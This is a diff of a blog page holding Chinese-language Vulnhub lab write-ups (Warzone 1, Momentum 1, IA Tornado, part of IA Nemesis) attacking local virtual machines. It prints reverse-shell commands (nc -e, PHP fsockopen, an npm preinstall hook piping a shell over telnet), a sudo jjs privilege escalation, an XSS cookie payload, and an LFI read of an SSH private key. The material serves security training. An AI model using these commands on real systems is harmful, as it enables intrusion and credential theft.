+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pip3 install simple-crypt</span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> simplecrypt <span class="keyword">import</span> encrypt, decrypt</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;sekret&#x27;</span></span><br><span class="line">text = base64.b64decode(<span class="string">&#x27;c2MAAk1Y/hAsEsn+FasElyXvGSI0JxD+n/SCtXbHNM+1/YEU54DO0EQRDfD3wz/lrbkXEBJJJd1ylXZpi/2dopaklmG6NCAXfGKl1eWAUNU1Iw==&#x27;</span>)</span><br><span class="line">passwd = decrypt(key, text)</span><br><span class="line"><span class="built_in">print</span>(passwd)</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-1/17.png" alt="image"></p>
+<p>5.登录到captain用户，可以查看第一个flag，user.txt：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ..</span><br><span class="line">cat user.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-1/18.png" alt="image"></p>
+</blockquote>
+<h3><span id="root提权">root提权</span></h3><blockquote>
+<p>1.通过sudo -l命令，可以看到jjs（jjs是让javascript可以调用java）可以执行特权命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-1/19.png" alt="image"></p>
+<p>2.那我们可以写一个java的shell提权利用js去调用再使用jjs去执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;Java.type(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;/usr/bin/nc -e /bin/bash 192.168.56.102 1234&#x27;)&quot;|sudo jjs</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-1/20.png" alt="image"></p>
+<p>3.成功提权到root，并可以在&#x2F;root&#x2F;Desktop下发现第二个flag，root.txt：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root/Desktop</span><br><span class="line">ls -la</span><br><span class="line">cat root.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-1/21.png" alt="image"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/Warzone/" rel="tag">Warzone</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2022/08/24/Shuriken-Node/">
                 Shuriken Node
             </a>
@@ -667,407 +1067,6 @@
         
             <div class="tags">
                 <a class="tag-none-link" href="/tags/Momentum/" rel="tag">Momentum</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/08/15/Momentum-1/">
-                Momentum 1
-            </a>
-        </h2>
-    
-    <time>
-        Aug 15, 2022
-    </time>
-    <section class="content">
-        <h1><span id="momentum1">Momentum:1</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称momentum1">名称：Momentum:1</span></h4><h4><span id="发布日期2021422">发布日期：2021.4.22</span></h4><h4><span id="作者al1enum">作者：AL1ENUM</span></h4><h4><span id="系列momentum">系列：Momentum</span></h4><h4><span id="推特al1enum">推特：@AL1ENUM</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>root:&#x2F;root&#x2F;root.txt</p>
-<h4><span id="难度简单">难度：简单</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名momentumova">文件名：Momentum.ova</span></h4><h4><span id="文件大小662mb">文件大小：662MB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimagemomentummomentumova">下载地址：</span></h4><h4><span id="md5-556bea96fe2cb1506814d1e79f5c5e19">MD5: 556BEA96FE2CB1506814D1E79F5C5E19</span></h4><h4><span id="sha1-40c918a7eff2eb3cf1708428a583702a4bffd96c">SHA1: 40C918A7EFF2EB3CF1708428A583702A4BFFD96C</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机Momentum和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
-<p><img src="/2022/08/15/Momentum-1/1.png" alt="image-"></p>
-</blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/Momentum-1/2.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/Momentum-1/3.png" alt="image-"></p>
-<p>2.再进行端口扫描，发现只开放了22和80端口，访问首页有一些图片：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.106 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/Momentum-1/4.png" alt="image-"></p>
-<p><img src="/2022/08/15/Momentum-1/5.png" alt="image-"></p>
-<p>3.最后再进行一下目录扫描，发现四个可见目录，可以去看看：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.106 -x html,txt,php,bak --wordlist=/usr/share/wordlists/dirb/common.txt，目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/Momentum-1/6.png" alt="image-"></p>
-</blockquote>
-<h3><span id="xss漏洞利用">XSS漏洞利用</span></h3><blockquote>
-<p>1.访问192.168.56.106&#x2F;js，发现有一个main.js，js里有个重定向链接opus-details.php?id&#x3D;，后面拼接了个参数str，而这个php是主页图片点击后再点击一次的详情介绍：</p>
-<p><img src="/2022/08/15/Momentum-1/7.png" alt="image-"></p>
-<p><img src="/2022/08/15/Momentum-1/8.png" alt="image-"></p>
-<p><img src="/2022/08/15/Momentum-1/9.png" alt="image-"></p>
-<p>2.拼接的str字串会被直接打印出来，因为是js下进行构建的，首先想到xss，构造xss的payload爆出cookie：</p>
-<p><img src="/2022/08/15/Momentum-1/10.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/Momentum-1/11.png" alt="image-"></p>
-<p>3.这cookie明显是进行了加密，回到main.js有提示，使用的是aes，进行解密得到很像用户名-密码的形式的字串auxerre-alienum##：</p>
-<p><img src="/2022/08/15/Momentum-1/12.png" alt="image-"></p>
-</blockquote>
-<h3><span id="ssh登录准备提权">SSH登录，准备提权</span></h3><blockquote>
-<p>1.因为靶机有开放22端口，利用ssh登录，发现用户auxerre的密码就是auxerre-alienum##：</p>
-<p><img src="/2022/08/15/Momentum-1/13.png" alt="image-"></p>
-<p>2.接下来我们要使用LinEnum.sh这个工具对靶机进行进一步信息收集，在kali搭建一个http服务，准备上传工具到靶机<br>（工具地址：<a target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh%EF%BC%89%EF%BC%9A">https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh）：</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8001，kali开启http服务</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/Momentum-1/14.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.56.102:8001/LinEnum.sh，靶机下载工具（文件在桌面）</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/Momentum-1/15.png" alt="image-"></p>
-<p>3.添加权限，靶机运行LinEnum.sh后，查看输出信息，发现6379端口占用，此端口是数据库redis的默认端口，确认后可以尝试kali登录redis：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod +x LinEnum.sh</span><br><span class="line">./LinEnum.sh &gt; 1.txt</span><br><span class="line">cat 1.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/Momentum-1/16.png" alt="image-"></p>
-<p><img src="/2022/08/15/Momentum-1/17.png" alt="image-"></p>
-<p><img src="/2022/08/15/Momentum-1/18.png" alt="image-"></p>
-<p>4.现在我们可以尝试利用ssh远程连接6379端口，然后在kali端登录，这里kali同样使用6379端口：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 6379:127.0.0.1:6379 auxerre@192.168.56.106</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/Momentum-1/19.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 127.0.0.1 -p 6379</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/Momentum-1/20.png" alt="image-"></p>
-</blockquote>
-<h3><span id="root提权">root提权</span></h3><blockquote>
-<p>1.我们可以在数据库内看到一个rootpass键，而键内包含着很像是密码的字串，使用root用户登录，成功提权：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">keys *</span><br><span class="line">get rootpass</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/Momentum-1/21.png" alt="image-"></p>
-<p>2.进行root登录，在&#x2F;root目录下能找到flag，即root.txt：</p>
-<p><img src="/2022/08/15/Momentum-1/22.png" alt="image-"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Momentum/" rel="tag">Momentum</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/08/15/IA-Tornado/">
-                IA Tornado
-            </a>
-        </h2>
-    
-    <time>
-        Aug 15, 2022
-    </time>
-    <section class="content">
-        <h1><span id="ia-tornado">IA: TORNADO</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称ia-tornado">名称：IA: Tornado</span></h4><h4><span id="发布日期20201220">发布日期：2020.12.20</span></h4><h4><span id="作者infosec-articles">作者：InfoSec Articles</span></h4><h4><span id="系列ia">系列：IA</span></h4><h4><span id="推特-infosecarticles">推特: @infosecarticles</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>catchme:&#x2F;~&#x2F;user.txt<br>root:&#x2F;root&#x2F;root.txt </p>
-<h4><span id="难度中等">难度：中等</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名tornadoova">文件名：tornado.ova</span></h4><h4><span id="文件大小1019mb">文件大小：1019MB</span></h4><h4><span id="下载地址httpsdownloadvulnhubcomiatornadoova">下载地址：</span></h4><h4><span id="md5-86b49bd71057db337a85c1ec1bab1076">MD5: 86B49BD71057DB337A85C1EC1BAB1076</span></h4><h4><span id="sha1-a74d80b7bde2b4da63aaf1e6b4714e43d6862409">SHA1: A74D80B7BDE2B4DA63AAF1E6B4714E43D6862409</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机tornado和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
-<p><img src="/2022/08/15/IA-Tornado/1.png" alt="image-"></p>
-</blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/IA-Tornado/2.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/IA-Tornado/3.png" alt="image-"></p>
-<p>2.再进行端口扫描，发现只开放了22和80端口，访问主页，还是Apache初始页，源码没有更多信息：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.132 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/IA-Tornado/4.png" alt="image-"></p>
-<p><img src="/2022/08/15/IA-Tornado/5.png" alt="image-"></p>
-<p>3.最后再进行一下目录扫描，发现&#x2F;bluesky目录，页面源码也没发现更多可用信息：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.132 -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/IA-Tornado/6.png" alt="image-"></p>
-<p><img src="/2022/08/15/IA-Tornado/7.png" alt="image-"></p>
-</blockquote>
-<h3><span id="文件包含漏洞发现">文件包含漏洞发现</span></h3><blockquote>
-<p>1.我们继续对&#x2F;bluesky目录进行扫描，发现有登录页与注册页，我们在注册页随意注册然后登录：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.132/bluesky -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/IA-Tornado/8.png" alt="image-"></p>
-<p><img src="/2022/08/15/IA-Tornado/9.png" alt="image-"></p>
-<p><img src="/2022/08/15/IA-Tornado/10.png" alt="image-"></p>
-<p>2.登录后，在PORTFOLIO页能发现提示存在LFI，并且在源码内有路径提示：</p>
-<p><img src="/2022/08/15/IA-Tornado/11.png" alt="image-"></p>
-<p>3.利用LFI，我们可以获取到一些登录账号：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.132/~tornado/imp.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/IA-Tornado/12.png" alt="image-"></p>
-</blockquote>
-<h3><span id="sql截断攻击">SQL截断攻击</span></h3><blockquote>
-<p>1.然而，当我们使用这些账号，会发现这些账号都已经被注册了，这时我在注册页源码发现前端对email长度做了最大限制：</p>
-<p><img src="/2022/08/15/IA-Tornado/13.png" alt="image-"></p>
-<p>2.这时可以想到是否存在SQL截断攻击的利用，修改maxlength后测试发现，能够将jacob@tornado用户的密码更改：</p>
-<p><img src="/2022/08/15/IA-Tornado/14.png" alt="image-"></p>
-<p><img src="/2022/08/15/IA-Tornado/15.png" alt="image-"></p>
-<p>3.成功登录到jacob@tornado：</p>
-<p><img src="/2022/08/15/IA-Tornado/16.png" alt="image-"></p>
-</blockquote>
-<h3><span id="命令注入构建shell">命令注入，构建shell</span></h3><blockquote>
-<p>1.现在我们可以在CONTACT页面输入payload，并在kali开启对应监听，获得shell：</p>
-<p><img src="/2022/08/15/IA-Tornado/17.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;192.168.56.102&quot;,9002);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br><span class="line"></span><br><span class="line">nc -lvnp 9002</span><br><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;);&#x27;</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/IA-Tornado/18.png" alt="image-"></p>
-</blockquote>
-<h3><span id="初步提权">初步提权</span></h3><blockquote>
-<p>1.查看可用文件权限，发现npm可以使用：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
-
-<p>2.先在kali下写一个json文件，如package.json，开启http服务：</p>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">vim package.json</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;jin&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;follow jin on medium and twitter&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;main&quot;</span><span class="punctuation">:</span> <span class="string">&quot;index.js&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;preinstall&quot;</span><span class="punctuation">:</span> <span class="string">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|telnet 192.168.56.102 9003 &gt; /tmp/f&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">python3 -m http.server <span class="number">8001</span></span><br></pre></td></tr></table></figure>
-
-<p>3.在靶机&#x2F;tmp目录下建立一个json目录，然后获取json文件，再利用npm触发shell：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">mkdir jin</span><br><span class="line">wget http://192.168.56.102:8001/package.json</span><br><span class="line">mv package.json jin</span><br><span class="line">chmod +s jin/</span><br><span class="line"></span><br><span class="line">sudo -u catchme /usr/bin/npm i /tmp/jin — unsafe</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/IA-Tornado/19.png" alt="image-"><br><img src="/2022/08/15/IA-Tornado/20.png" alt="image-"></p>
-<p><img src="/2022/08/15/IA-Tornado/21.png" alt="image-"></p>
-<p>4.可以成功地在catchme用户目录下找到第一个flag，user.txt：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">ls -al</span><br><span class="line">cat user.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/IA-Tornado/22.png" alt="image-"></p>
-</blockquote>
-<h3><span id="root提权">root提权</span></h3><blockquote>
-<p>1.查看同目录下的enc.py文件，发现是个加密程序，告知我们密文，粗略阅读程序，明显是凯撒密码的变种，我们利用<a target="_blank" rel="noopener" href="https://www.boxentriq.com/code-breaking/caesar-cipher%EF%BC%8C%E4%B8%8D%E4%BD%BF%E7%94%A8key%E8%87%AA%E5%8A%A8%E7%A0%B4%E8%A7%A3%EF%BC%9A">https://www.boxentriq.com/code-breaking/caesar-cipher，不使用key自动破解：</a></p>
-<p><img src="/2022/08/15/IA-Tornado/23.png" alt="image-"></p>
-<p><img src="/2022/08/15/IA-Tornado/24.png" alt="image-"></p>
-<p>2.但自动破解出来的并不是密码，但非常接近了，我们回看程序，对比自动解出的字串，得到key是u，而w是在u后的字符，不应该变化，可分析出最后密码是idkrootpassword：</p>
-<p><img src="/2022/08/15/IA-Tornado/25.png" alt="image-"></p>
-<p>3.最后能在&#x2F;root目录下发现第二个flag，root.txt：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls -al</span><br><span class="line">cat root.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/IA-Tornado/26.png" alt="image-"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/IA/" rel="tag">IA</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/08/15/IA-Nemesis/">
-                IA Nemesis
-            </a>
-        </h2>
-    
-    <time>
-        Aug 15, 2022
-    </time>
-    <section class="content">
-        <h1><span id="ia-nemesis-101">IA: NEMESIS (1.0.1)</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称ia-nemesis-101">名称：IA: Nemesis (1.0.1)</span></h4><h4><span id="发布日期20201025">发布日期：2020.10.25</span></h4><h4><span id="作者infosec-articles">作者：InfoSec Articles</span></h4><h4><span id="系列ia">系列：IA</span></h4><h4><span id="推特-infosecarticles">推特: @infosecarticles</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>thanos:&#x2F;<del>&#x2F;flag1.txt<br>carlos:&#x2F;</del>&#x2F;flag2.txt<br>root:&#x2F;root&#x2F;root.txt </p>
-<h4><span id="难度困难">难度：困难</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名nemesis-v101ova">文件名：Nemesis-v1.0.1.ova</span></h4><h4><span id="文件大小537mb">文件大小：537MB</span></h4><h4><span id="下载地址httpsdownloadvulnhubcomianemesis-v101ova">下载地址：</span></h4><h4><span id="md5-1e1b81a4b2af9a2bac30ed2b26b779bb">MD5: 1E1B81A4B2AF9A2BAC30ED2B26B779BB</span></h4><h4><span id="sha1-182f226ebd925575f50f24d04c515df79424775e">SHA1: 182F226EBD925575F50F24D04C515DF79424775E</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机Nemesis和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
-<p><img src="/2022/08/15/IA-Nemesis/1.png" alt="image-"></p>
-</blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/IA-Nemesis/2.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/IA-Nemesis/3.png" alt="image-"></p>
-<p>2.再进行端口扫描，发现开放了80，52845和52846端口，访问主页，在sign up页的validate函数可以发现登录的用户和密码，登录之后没有可用信息：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.131 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/IA-Nemesis/4.png" alt="image-"></p>
-<p><img src="/2022/08/15/IA-Nemesis/5.png" alt="image-"></p>
-<p><img src="/2022/08/15/IA-Nemesis/8.png" alt="image-"></p>
-<p>3.最后再进行一下目录扫描，发现robots.txt文件，提示我们去寻找可用的攻击点：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.131 -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/IA-Nemesis/6.png" alt="image-"></p>
-<p><img src="/2022/08/15/IA-Nemesis/7.png" alt="image-"></p>
-</blockquote>
-<h3><span id="文件包含漏洞利用">文件包含漏洞利用</span></h3><blockquote>
-<p>1.我们接着访问52845端口，网页源码没有过多发现：</p>
-<p><img src="/2022/08/15/IA-Nemesis/9.png" alt="image-"></p>
-<p>2.在Contact Us页发现在Message框内输入任何信息都会收到写入文件的提示，测试后发现确实存在文件包含漏洞：</p>
-<p><img src="/2022/08/15/IA-Nemesis/10.png" alt="image-"></p>
-<p><img src="/2022/08/15/IA-Nemesis/11.png" alt="image-"></p>
-<p>3.发现靶机存在thanos用户，可以尝试获取其ssh密钥：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home/thanos/.ssh/id_rsa</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/IA-Nemesis/12.png" alt="image-"></p>
-<p>4.将thanos用户ssh私钥获取到kali后，ssh登录thanos用户：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 400 id</span><br><span class="line">ssh thanos@192.168.56.131 -p 52846 -i id</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/IA-Nemesis/13.png" alt="image-"></p>
-<p>5.登录后可在用户目录下发现第一个flag，即flag1.txt：</p>
